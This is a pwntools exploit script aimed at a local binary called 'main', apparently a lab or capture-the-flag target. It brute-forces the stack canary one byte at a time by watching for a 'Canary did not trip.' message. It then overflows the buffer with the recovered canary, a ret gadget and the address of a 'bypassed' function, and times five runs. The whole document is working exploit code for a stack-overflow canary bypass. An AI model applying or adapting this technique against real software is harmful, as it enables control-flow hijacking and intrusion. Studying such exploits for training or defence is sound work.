from pwn import *

buf = 8
after_canary = 7
canary_bytes = 1

executable = "main"



elf = ELF(f"./{executable}")
final = elf.symbols['bypassed']
ret = ROP(f"{executable}").find_gadget(['ret']).address
print(hex(ret),hex(final))
times = []
#exit()
for i in range(5):
    start_time = time.time()
    p=process(f"./{executable}")
    p.recv()
    p.sendline(b"3")
    print(p.recv())
    p.close()

    canary = b""

    for i in range(canary_bytes):
        for i in range(256):
            p=process(f"./{executable}")
            p.recv()
            p.sendline(b"2")
            
            """
            print(p.recvline())
            print(p.recvline())
            print(p.recvline())"""
            p.recvuntil("read:")
            p.send(f"{buf+len(canary)+1}\n")
            #print(buf+len(canary)+1)
            #print(p.recv(), "------------------------------------------------------------------")
            p.recvuntil("buffer:")
            #Payload
            
            #print(b"a"*buf + canary + p8(i),"Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
            p.send(b"a"*buf + canary + chr(i).encode('utf-16')[2:3])
            #p.interactive()
            
            #a = p.recvuntil("buffer:")
            #print(a)
            p.recvline()
            line = p.recv()
            p.close()
            if "Canary did not trip." in str(line):
                canary = canary + chr(i).encode('utf-16')[2:3]

                #print(canary,"WORKS---------------------------------------------------------------------------WORKS")
                #pause(1)
                break
    
    p=process(f"./{executable}")
    p.recv()
    p.sendline(b"2")

    p.recvuntil("read:")
    p.sendline(f"{buf+after_canary+len(canary)+8+8}")
    p.recvuntil("buffer:"),"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    #Payload
    p.send(b"a"*buf + canary + b"a"*(after_canary+1) + p64(ret) + p64(final))
    #p.recvall()
    p.recvuntil(b"Final Time:")


    end_time = time.time()
    times.append([start_time,end_time,end_time-start_time])
    p.close()
    

print(times)